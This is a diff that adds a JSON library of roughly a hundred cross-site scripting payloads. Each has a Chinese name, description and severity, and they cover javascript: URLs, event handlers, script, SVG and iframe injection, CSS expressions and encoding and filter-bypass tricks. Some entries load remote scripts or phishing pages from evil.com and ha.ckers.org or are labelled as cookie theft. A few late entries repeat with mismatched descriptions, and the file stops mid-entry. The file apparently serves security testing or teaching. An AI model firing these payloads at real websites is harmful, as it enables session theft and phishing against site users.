@@ -1,0 +1,2560 @@
+[
+  {
+    "name": "基础JavaScript伪协议",
+    "code": "<a href=\"javascript:alert('XSS')\">点击测试</a>",
+    "desc": "最基础的XSS向量，通过javascript:伪协议执行JavaScript代码。",
+    "level": "medium",
+    "tags": [
+      "HTML属性",
+      "链接"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "HTML实体编码绕过",
+    "code": "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">点击测试</a>",
+    "desc": "使用HTML实体编码绕过简单的关键词过滤。",
+    "level": "medium",
+    "tags": [
+      "编码绕过",
+      "HTML实体"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "Unicode编码绕过",
+    "code": "<a href=\"javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)\">点击测试</a>",
+    "desc": "使用Unicode编码绕过关键词检测。",
+    "level": "high",
+    "tags": [
+      "编码绕过",
+      "Unicode"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "大小写混合绕过",
+    "code": "<a href=\"JaVaScRiPt:alert('XSS')\">点击测试</a>",
+    "desc": "利用大小写混合绕过大小写敏感的过滤器。",
+    "level": "low",
+    "tags": [
+      "大小写绕过"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "Tab制表符绕过",
+    "code": "<a href=\"jav\tascript:alert('XSS')\">点击测试</a>",
+    "desc": "使用Tab字符绕过关键词匹配。",
+    "level": "medium",
+    "tags": [
+      "空白字符绕过"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "换行符绕过",
+    "code": "<a href=\"jav\nascript:alert('XSS')\">点击测试</a>",
+    "desc": "使用换行符绕过关键词匹配。",
+    "level": "medium",
+    "tags": [
+      "空白字符绕过"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "Data URI方式",
+    "code": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">点击测试</a>",
+    "desc": "使用Data URI编码执行JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "Data URI",
+      "Base64"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "onerror事件",
+    "code": "<img src=x onerror=alert('XSS')>",
+    "desc": "利用图片加载错误触发JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "事件处理器",
+      "img标签"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "onload事件",
+    "code": "<img src=\"valid.jpg\" onload=alert('XSS')>",
+    "desc": "利用图片加载成功触发JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "事件处理器",
+      "img标签"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "onclick事件",
+    "code": "<div onclick=alert('XSS')>点击我</div>",
+    "desc": "利用点击事件触发JavaScript代码。",
+    "level": "medium",
+    "tags": [
+      "事件处理器",
+      "点击"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "onmouseover事件",
+    "code": "<div onmouseover=alert('XSS')>鼠标移到这里</div>",
+    "desc": "利用鼠标悬停事件触发JavaScript代码。",
+    "level": "medium",
+    "tags": [
+      "事件处理器",
+      "鼠标悬停"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "onfocus事件",
+    "code": "<input onfocus=alert('XSS') autofocus>",
+    "desc": "利用输入框获取焦点触发JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "事件处理器",
+      "input标签"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "onblur事件",
+    "code": "<input onblur=alert('XSS')>",
+    "desc": "利用输入框失去焦点触发JavaScript代码。",
+    "level": "medium",
+    "tags": [
+      "事件处理器",
+      "input标签"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "body onload事件",
+    "code": "<body onload=alert('XSS')>",
+    "desc": "利用页面加载完成触发JavaScript代码。",
+    "level": "critical",
+    "tags": [
+      "事件处理器",
+      "body标签"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "基础script标签",
+    "code": "<script>alert('XSS')</script>",
+    "desc": "最直接的XSS向量，直接插入script标签。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "基础"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "外部脚本引用",
+    "code": "<script src=\"http://evil.com/xss.js\"></script>",
+    "desc": "引用外部恶意JavaScript文件。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "外部引用"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "SVG script标签",
+    "code": "<svg><script>alert('XSS')</script></svg>",
+    "desc": "在SVG标签内使用script标签。",
+    "level": "high",
+    "tags": [
+      "SVG",
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "SVG onload事件",
+    "code": "<svg onload=alert('XSS')>",
+    "desc": "利用SVG标签的onload事件。",
+    "level": "high",
+    "tags": [
+      "SVG",
+      "事件处理器"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Math标签",
+    "code": "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">点击</maction></math>",
+    "desc": "利用Math标签执行JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "Math标签",
+      "XLink"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "iframe注入",
+    "code": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "desc": "利用iframe标签执行JavaScript代码。",
+    "level": "critical",
+    "tags": [
+      "iframe",
+      "框架注入"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "iframe外部页面",
+    "code": "<iframe src=\"http://evil.com/phishing.html\"></iframe>",
+    "desc": "嵌入外部恶意页面进行钓鱼攻击。",
+    "level": "critical",
+    "tags": [
+      "iframe",
+      "钓鱼"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "embed标签",
+    "code": "<embed src=\"javascript:alert('XSS')\">",
+    "desc": "利用embed标签执行JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "embed标签"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "object标签",
+    "code": "<object data=\"javascript:alert('XSS')\">",
+    "desc": "利用object标签执行JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "object标签"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "video标签",
+    "code": "<video><source onerror=\"alert('XSS')\">",
+    "desc": "利用video标签的source错误事件。",
+    "level": "high",
+    "tags": [
+      "video标签",
+      "事件处理器"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "audio标签",
+    "code": "<audio src=x onerror=alert('XSS')>",
+    "desc": "利用audio标签的错误事件。",
+    "level": "high",
+    "tags": [
+      "audio标签",
+      "事件处理器"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "style标签注入",
+    "code": "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
+    "desc": "在CSS中使用javascript伪协议（旧浏览器）。",
+    "level": "low",
+    "tags": [
+      "CSS",
+      "style标签"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "expression表达式",
+    "code": "<div style=\"width:expression(alert('XSS'))\">",
+    "desc": "利用CSS expression执行JavaScript（IE特有）。",
+    "level": "low",
+    "tags": [
+      "CSS",
+      "expression",
+      "IE"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "行内样式注入",
+    "code": "<div style=\"background:url(javascript:alert('XSS'))\">",
+    "desc": "在行内样式中使用javascript伪协议。",
+    "level": "low",
+    "tags": [
+      "CSS",
+      "行内样式"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "双写绕过",
+    "code": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+    "desc": "利用过滤器只过滤一次的特性绕过。",
+    "level": "medium",
+    "tags": [
+      "绕过技巧",
+      "双写"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "注释绕过",
+    "code": "<scr<!---->ipt>alert('XSS')</scr<!---->ipt>",
+    "desc": "在关键词中插入HTML注释绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "绕过技巧",
+      "注释"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "空字节绕过",
+    "code": "<scr\\x00ipt>alert('XSS')</script>",
+    "desc": "利用空字节绕过某些过滤器。",
+    "level": "medium",
+    "tags": [
+      "绕过技巧",
+      "空字节"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "Base64编码绕过",
+    "code": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">点击</a>",
+    "desc": "使用Base64编码绕过关键词检测。",
+    "level": "high",
+    "tags": [
+      "编码绕过",
+      "Base64"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "JSONP绕过",
+    "code": "<script src=\"http://api.example.com/jsonp?callback=alert\"></script>",
+    "desc": "利用JSONP接口执行任意JavaScript。",
+    "level": "high",
+    "tags": [
+      "JSONP",
+      "绕过技巧"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "SVG/Onload简洁向量",
+    "code": "<svg/onload=alert(1)>",
+    "desc": "利用SVG标签的onload事件，无需闭合，非常简洁的XSS向量。",
+    "level": "critical",
+    "tags": [
+      "SVG",
+      "事件处理器",
+      "简洁"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签窃取Cookie",
+    "code": "<script>alert(document.cookie)</script>",
+    "desc": "直接窃取用户Cookie信息。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "Cookie窃取"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "单引号闭合注入",
+    "code": "'><script>alert(document.cookie)</script>",
+    "desc": "用于闭合单引号属性的XSS注入。",
+    "level": "critical",
+    "tags": [
+      "属性闭合",
+      "注入技巧"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "双引号闭合注入",
+    "code": "\"><script>alert('Vulnerable')</script>",
+    "desc": "用于闭合双引号属性的XSS注入。",
+    "level": "critical",
+    "tags": [
+      "属性闭合",
+      "注入技巧"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "URL编码Script标签",
+    "code": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "desc": "使用URL编码绕过简单的关键词过滤。",
+    "level": "medium",
+    "tags": [
+      "URL编码",
+      "编码绕过"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "IMG标签JavaScript协议",
+    "code": "<img src=\"javascript:alert('XSS')\">",
+    "desc": "在IMG标签的src属性中使用javascript伪协议（旧浏览器）。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "JavaScript URL"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG无引号事件",
+    "code": "<IMG src=javascript:alert('XSS')>",
+    "desc": "IMG标签不使用引号，绕过某些过滤器。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "无引号"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG大小写混合",
+    "code": "<IMG src=JaVaScRiPt:alert('XSS')>",
+    "desc": "IMG标签中使用大小写混合绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "大小写绕过"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG空白字符绕过",
+    "code": "<IMG src=\"jav ascript:alert('XSS');\">",
+    "desc": "在javascript关键词中插入空白字符绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "空白字符绕过"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG Tab换行绕过",
+    "code": "<IMG src=\"jav&#x09;ascript:alert('XSS');\">",
+    "desc": "在javascript关键词中插入Tab字符绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "空白字符绕过"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG换行符绕过",
+    "code": "<IMG src=\"jav&#x0A;ascript:alert('XSS');\">",
+    "desc": "在javascript关键词中插入换行符绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "空白字符绕过"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG回车符绕过",
+    "code": "<IMG src=\"jav&#x0D;ascript:alert('XSS');\">",
+    "desc": "在javascript关键词中插入回车符绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "空白字符绕过"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "BODY背景注入",
+    "code": "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
+    "desc": "利用BODY标签的BACKGROUND属性执行JavaScript（旧浏览器）。",
+    "level": "low",
+    "tags": [
+      "body标签",
+      "背景属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "BODY Onload事件",
+    "code": "<BODY ONLOAD=alert('XSS')>",
+    "desc": "利用BODY标签的onload事件自动执行JavaScript。",
+    "level": "critical",
+    "tags": [
+      "body标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG DYNSRC属性",
+    "code": "<IMG DYNSRC=\"javascript:alert('XSS')\">",
+    "desc": "利用IMG标签的DYNSRC属性（IE特有）。",
+    "level": "low",
+    "tags": [
+      "img标签",
+      "IE特有"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG LOWSRC属性",
+    "code": "<IMG LOWSRC=\"javascript:alert('XSS')\">",
+    "desc": "利用IMG标签的LOWSRC属性（旧浏览器）。",
+    "level": "low",
+    "tags": [
+      "img标签",
+      "旧浏览器"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "BGSOUND音频注入",
+    "code": "<BGSOUND src=\"javascript:alert('XSS');\">",
+    "desc": "利用BGSOUND标签执行JavaScript（IE特有）。",
+    "level": "low",
+    "tags": [
+      "BGSOUND",
+      "IE特有"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "BR大小属性注入",
+    "code": "<br size=\"&{alert('XSS')}\">",
+    "desc": "利用BR标签的size属性执行JavaScript（Netscape 4特有）。",
+    "level": "low",
+    "tags": [
+      "BR标签",
+      "Netscape特有"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "LINK样式表注入",
+    "code": "<LINK REL=\"stylesheet\" href=\"javascript:alert('XSS');\">",
+    "desc": "利用LINK标签的href属性执行JavaScript。",
+    "level": "medium",
+    "tags": [
+      "LINK标签",
+      "样式表"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG VBScript协议",
+    "code": "<IMG src='vbscript:msgbox(\"XSS\")'>",
+    "desc": "使用VBScript协议执行代码（IE特有）。",
+    "level": "low",
+    "tags": [
+      "img标签",
+      "VBScript",
+      "IE特有"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "META刷新注入",
+    "code": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
+    "desc": "利用META标签的refresh属性执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "META标签",
+      "页面刷新"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IFRAME JavaScript协议",
+    "code": "<IFRAME src=javascript:alert('XSS')></IFRAME>",
+    "desc": "利用IFRAME标签执行JavaScript代码。",
+    "level": "critical",
+    "tags": [
+      "iframe",
+      "JavaScript URL"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "FRAMESET框架注入",
+    "code": "<FRAMESET><FRAME src=javascript:alert('XSS')></FRAMESET>",
+    "desc": "利用FRAME标签执行JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "FRAME",
+      "框架注入"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "TABLE背景注入",
+    "code": "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
+    "desc": "利用TABLE标签的BACKGROUND属性执行JavaScript（旧浏览器）。",
+    "level": "low",
+    "tags": [
+      "TABLE标签",
+      "背景属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "DIV背景样式注入",
+    "code": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
+    "desc": "利用DIV标签的style属性执行JavaScript（旧浏览器）。",
+    "level": "low",
+    "tags": [
+      "DIV标签",
+      "CSS注入"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "DIV Expression表达式",
+    "code": "<DIV STYLE=\"width: expression(alert('XSS'));\">",
+    "desc": "利用CSS expression执行JavaScript（IE特有）。",
+    "level": "medium",
+    "tags": [
+      "DIV标签",
+      "expression",
+      "IE特有"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE import导入",
+    "code": "<STYLE>@im\\port'\\\\ja\\\\vasc\\\\ript:alert(\"XSS\")';</STYLE>",
+    "desc": "利用STYLE标签的@import规则绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签",
+      "@import",
+      "CSS注入"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "IMG Style Expression",
+    "code": "<IMG STYLE='xss:expre\\ssion(alert(\"XSS\"))'>",
+    "desc": "利用IMG标签的style属性执行expression（IE特有）。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "expression",
+      "IE特有"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE标签JavaScript",
+    "code": "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
+    "desc": "将STYLE标签的type设置为JavaScript执行代码。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签",
+      "type属性"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE类背景注入",
+    "code": "<STYLE TYPE=\"text/css\">.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A class=\"XSS\"></A>",
+    "desc": "定义CSS类并在其中注入JavaScript。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签",
+      "CSS类"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE Body背景注入",
+    "code": "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
+    "desc": "通过CSS为BODY设置背景执行JavaScript。",
+    "level": "medium",
+    "tags": [
+      "STYLE标签",
+      "body背景"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "BASE标签注入",
+    "code": "<BASE href=\"javascript:alert('XSS');//\">",
+    "desc": "利用BASE标签改变页面中所有相对URL的基础路径。",
+    "level": "high",
+    "tags": [
+      "BASE标签",
+      "路径劫持"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Eval拼接绕过",
+    "code": "a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('XSS');\";eval(a+b+c+d);",
+    "desc": "利用字符串拼接和eval函数绕过关键词过滤。",
+    "level": "high",
+    "tags": [
+      "eval",
+      "字符串拼接"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "XML数据注入",
+    "code": "<XML src=\"javascript:alert('XSS');\">",
+    "desc": "利用XML标签执行JavaScript。",
+    "level": "medium",
+    "tags": [
+      "XML标签",
+      "数据岛"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Script标签属性绕过",
+    "code": "<SCRIPT a=\">\" src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
+    "desc": "利用script标签的属性混淆绕过过滤。",
+    "level": "high",
+    "tags": [
+      "script标签",
+      "属性混淆"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script空属性绕过",
+    "code": "<SCRIPT =\">\" src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
+    "desc": "利用script标签的空属性绕过过滤。",
+    "level": "high",
+    "tags": [
+      "script标签",
+      "空属性"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script引号混淆",
+    "code": "<SCRIPT a=\">\" '' src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
+    "desc": "利用引号混淆绕过script标签过滤。",
+    "level": "high",
+    "tags": [
+      "script标签",
+      "引号混淆"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script动态拼接",
+    "code": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
+    "desc": "利用document.write动态拼接script标签。",
+    "level": "high",
+    "tags": [
+      "script标签",
+      "动态拼接"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "IMG十进制编码",
+    "code": "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
+    "desc": "使用十进制HTML实体编码绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "十进制编码"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG十六进制编码",
+    "code": "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
+    "desc": "使用十六进制HTML实体编码绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "十六进制编码"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Script闭合注入",
+    "code": "</script><script>alert('XSS');</script>",
+    "desc": "先闭合现有的script标签，再注入新的script标签。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "闭合注入"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "INPUT图片类型注入",
+    "code": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
+    "desc": "利用INPUT标签的image类型执行JavaScript。",
+    "level": "medium",
+    "tags": [
+      "INPUT标签",
+      "图片类型"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Marquee滚动事件",
+    "code": "<marquee onscroll=alert(1)>",
+    "desc": "利用marquee标签的onscroll事件执行JavaScript。",
+    "level": "medium",
+    "tags": [
+      "marquee标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "Details切换事件",
+    "code": "<details open ontoggle=alert(document.domain)>",
+    "desc": "利用details标签的ontoggle事件执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "details标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "Embed JavaScript协议",
+    "code": "<embed src=javascript:alert(document.domain)>",
+    "desc": "利用embed标签执行JavaScript代码。",
+    "level": "high",
+    "tags": [
+      "embed标签",
+      "JavaScript URL"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Script标签大小写混合",
+    "code": "<sCrIpT>alert(1)</sCrIpT>",
+    "desc": "利用大小写混合绕过script标签过滤。",
+    "level": "medium",
+    "tags": [
+      "script标签",
+      "大小写绕过"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "IMG Onerror无引号",
+    "code": "<img src=1 onerror=alert(1)>",
+    "desc": "IMG标签使用onerror事件，无需引号。",
+    "level": "high",
+    "tags": [
+      "img标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "IMG Onerror大小写混合",
+    "code": "<iMg src=1 oNeRrOr=alert(1)>",
+    "desc": "IMG标签使用大小写混合绕过事件过滤。",
+    "level": "medium",
+    "tags": [
+      "img标签",
+      "大小写绕过"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "Base路径劫持",
+    "code": "<base href=javascript:/M/><a href=,alert(1)>M</a>",
+    "desc": "利用BASE标签劫持相对路径执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "BASE标签",
+      "路径劫持"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Textarea闭合注入",
+    "code": "</textarea><script>alert(1)</script>",
+    "desc": "先闭合textarea标签，再注入script标签。",
+    "level": "critical",
+    "tags": [
+      "textarea标签",
+      "闭合注入"
+    ],
+    "category": "特殊绕过"
+  },
+  {
+    "name": "DIV样式背景注入",
+    "code": "<div style=\"background-image:url(javascript:alert(/xss/))\">",
+    "desc": "利用DIV标签的style属性执行JavaScript（旧浏览器）。",
+    "level": "low",
+    "tags": [
+      "DIV标签",
+      "CSS注入"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "STYLE import外部CSS",
+    "code": "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
+    "desc": "利用@import导入外部恶意CSS文件。",
+    "level": "high",
+    "tags": [
+      "STYLE标签",
+      "@import"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "IFRAME Data URI",
+    "code": "<iframe src=\"data:text/html,<iframe src=javascript:alert('M')></iframe>\"></iframe>",
+    "desc": "利用Data URI在iframe中执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "iframe",
+      "Data URI"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IFRAME Base64编码",
+    "code": "<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>",
+    "desc": "利用Base64编码的Data URI在iframe中执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "iframe",
+      "Base64编码"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IFRAME srcdoc属性",
+    "code": "<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>",
+    "desc": "利用iframe的srcdoc属性执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "iframe",
+      "srcdoc属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Form表单注入",
+    "code": "<form action=javascript:alert(1)><input type=submit>",
+    "desc": "利用form标签的action属性执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "form标签",
+      "action属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Button formaction注入",
+    "code": "<form><button formaction=javascript:alert(1)>M</button></form>",
+    "desc": "利用button标签的formaction属性执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "button标签",
+      "formaction属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "Input formaction注入",
+    "code": "<form><input formaction=javascript:alert(1) type=submit value=M></form>",
+    "desc": "利用input标签的formaction属性执行JavaScript。",
+    "level": "high",
+    "tags": [
+      "input标签",
+      "formaction属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "SVG Onload窃取域名",
+    "code": "<svg onload=alert(document.domain)>",
+    "desc": "利用SVG标签的onload事件窃取域名信息。",
+    "level": "high",
+    "tags": [
+      "SVG",
+      "事件处理器"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "IMG Onerror窃取域名",
+    "code": "<img src=document.domain onerror=alert(document.domain)>",
+    "desc": "利用IMG标签的onerror事件窃取域名信息。",
+    "level": "high",
+    "tags": [
+      "img标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "M标签鼠标悬停",
+    "code": "<M onmouseover=alert(document.domain)>M",
+    "desc": "利用自定义标签的onmouseover事件执行JavaScript。",
+    "level": "medium",
+    "tags": [
+      "自定义标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "A标签JavaScript正则",
+    "code": "<a href=javascript:/0/,alert(%22M%22)>M</a>",
+    "desc": "利用JavaScript正则表达式语法执行代码。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "正则表达式"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "IMG Onerror HTML实体",
+    "code": "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
+    "desc": "使用十进制HTML实体编码绕过事件处理器过滤。",
+    "level": "high",
+    "tags": [
+      "img标签",
+      "HTML实体编码"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "双左尖括号绕过",
+    "code": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
+    "desc": "使用双左尖括号绕过某些过滤器。",
+    "level": "medium",
+    "tags": [
+      "script标签",
+      "双尖括号"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "XSS Behavior行为",
+    "code": "<XSS STYLE=\"behavior: url(xss.htc);\">",
+    "desc": "利用XSS自定义标签的behavior属性（IE特有）。",
+    "level": "low",
+    "tags": [
+      "自定义标签",
+      "behavior",
+      "IE特有"
+    ],
+    "category": "CSS注入"
+  },
+  {
+    "name": "TABLE TD背景注入",
+    "code": "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
+    "desc": "利用TABLE的TD标签背景属性执行JavaScript。",
+    "level": "low",
+    "tags": [
+      "TABLE标签",
+      "背景属性"
+    ],
+    "category": "HTML注入"
+  },
+  {
+    "name": "IMG Onerror窃取Cookie",
+    "code": "\"><img src=x onerror=alert(document.cookie)>.gif",
+    "desc": "结合文件上传场景，利用IMG标签窃取Cookie。",
+    "level": "critical",
+    "tags": [
+      "img标签",
+      "文件上传",
+      "Cookie窃取"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:alert('test')\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A JavaScript协议",
+    "code": "<a href=\"javascript:alert('xss')\">link</a>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "high",
+    "tags": [
+      "a标签",
+      "JavaScript URL"
+    ],
+    "category": "JavaScript URL"
+  },
+  {
+    "name": "A XSS注入",
+    "code": "<a href='vbscript:MsgBox(\"XSS\")'>link</a>",
